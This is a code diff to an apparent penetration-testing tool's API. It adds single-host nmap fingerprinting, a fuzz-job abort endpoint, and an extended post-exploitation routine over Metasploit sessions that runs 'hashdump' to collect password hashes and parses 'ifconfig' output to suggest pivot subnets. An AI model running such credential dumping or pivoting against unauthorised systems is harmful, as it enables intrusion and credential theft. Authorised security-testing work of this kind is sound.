@@ -1323,17 +1323,28 @@ def neighbors_jobs() -> dict[str, Any]:
 
 
 @router.post("/neighbors/fingerprint")
-def neighbors_fingerprint(background: BackgroundTasks) -> dict[str, Any]:
+def neighbors_fingerprint(
+    req: dict[str, Any] | None = None, background: BackgroundTasks = None  # type: ignore[assignment]
+) -> dict[str, Any]:
     """Run an nmap service/version/OS fingerprint scan across all discovered
     neighbor hosts.
 
     Runs: nmap -sV -sC -O --top-ports 100 -vvv -Pn
     Results are stored in the neighbors.db and merged into the graph endpoint.
+    Accepts {"ip": "x.x.x.x"} to fingerprint a single host.
     """
-    neighbor_hosts = _load_neighbor_hosts()
+    body = req or {}
+    ip_filter = (body.get("ip") or "").strip() or None
+    if ip_filter:
+        stored = _load_neighbor_hosts().get(ip_filter, {})
+        neighbor_hosts = {ip_filter: {**stored, "ip": ip_filter}}
+    else:
+        neighbor_hosts = _load_neighbor_hosts()
     if not neighbor_hosts:
         raise HTTPException(
-            status_code=400, detail="no neighbor hosts found — run discovery first"
+            status_code=400,
+            detail="no neighbor hosts found — run discovery first"
+            + (f" (no record for {ip_filter})" if ip_filter else ""),
         )
 
     job_id = uuid.uuid4().hex[:12]
@@ -2238,7 +2249,7 @@ def _post_exploit_recon(msf_session_id: str) -> dict[str, str]:
     if sess is None:
         conn.close()
         return results
-    for cmd in ("sysinfo", "getuid", "hashdump"):
+    for cmd in ("sysinfo", "getuid", "ifconfig", "hashdump"):
         with suppress(Exception):
             out = str(sess.run_shell_cmd(cmd))[:600]
         if out:
@@ -2248,6 +2259,38 @@ def _post_exploit_recon(msf_session_id: str) -> dict[str, str]:
                 "VALUES (?, ?, ?, ?)",
                 (str(msf_session_id), cmd, out, datetime.now(UTC).isoformat()),
             )
+    # pivot suggestion: subnets reachable through this session that the
+    # session store has not seen yet — surfaced to the operator, never scanned
+    import re
+
+    ifcfg = results.get("ifconfig") or ""
+    subnets: list[str] = []
+    known_hosts: set[str] = set()
+    try:
+        c2 = _neighbor_db()
+        known_hosts = {
+            r[0] for r in c2.execute("SELECT ip FROM discovered_hosts").fetchall()
+        }
+        c2.close()
+    except Exception:
+        pass
+    for ip_match in re.findall(
+        r"(?:inet addr:?|inet )((?:\d{1,3}\.){3}\d{1,3})", ifcfg
+    ):
+        ip = ip_match.strip()
+        parts = ip.split(".")
+        if ip in known_hosts or ip.startswith(("127.", "10.7.")):
+            continue
+        if len(parts) == 4 and all(p.isdigit() for p in parts):
+            subnets.append(".".join(parts[:3]) + ".0/24")
+    subnets = list(dict.fromkeys(subnets))[:3]
+    if subnets:
+        results["pivot_subnets"] = ",".join(subnets)
+        logger.info(
+            "[pivot] session %s exposes new subnet(s): %s",
+            msf_session_id,
+            ", ".join(subnets),
+        )
     conn.commit()
     conn.close()
     return results
@@ -2471,6 +2514,16 @@ def fuzz_status(job_id: str) -> dict[str, Any]:
     if not job:
         raise HTTPException(status_code=404, detail="fuzz job not found")
     return job
+
+
+@router.post("/fuzz/{job_id}/abort")
+def fuzz_abort(job_id: str) -> dict[str, Any]:
+    job = _fuzz_jobs.get(job_id)
+    if not job:
+        raise HTTPException(status_code=404, detail="fuzz job not found")
+    job["status"] = "abort_requested"
+    logger.info("[fuzz %s] abort requested", job_id)
+    return {"status": "abort_requested"}
 
 
 @router.post("/vulnleads")
